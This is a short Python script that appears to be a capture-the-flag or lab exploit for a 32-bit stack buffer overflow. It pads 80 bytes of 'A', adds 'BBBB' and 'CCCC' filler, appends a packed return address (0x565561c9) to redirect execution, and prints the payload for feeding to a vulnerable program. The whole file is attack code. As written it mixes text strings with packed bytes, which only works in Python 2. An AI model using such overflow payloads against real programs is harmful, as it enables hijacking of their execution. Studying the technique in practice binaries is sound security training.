from struct import pack
ret_addr = 0x565561c9
output = "A" * 80 
output += "BBBB" 
output += "CCCC" 
output += pack("<I", ret_addr) 
print(output)
